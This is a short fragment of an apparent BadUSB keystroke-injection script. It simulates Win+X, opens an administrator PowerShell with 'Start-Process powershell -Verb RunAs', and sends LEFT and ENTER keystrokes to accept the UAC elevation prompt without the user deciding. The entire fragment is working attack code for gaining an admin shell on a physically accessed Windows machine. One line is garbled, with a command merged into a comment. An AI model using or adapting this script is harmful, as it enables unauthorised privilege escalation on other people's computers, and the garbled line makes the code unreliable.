...
badusb.press("GUI", "x"); // Open Run
delay(900);
badusb.press("a"); // Open Runbadusb.println('powershell -Command "Start-Process powershell -Verb RunAs"'); 
delay(1900);
badusb.press("LEFT");
delay(2500);
badusb.press("ENTER");
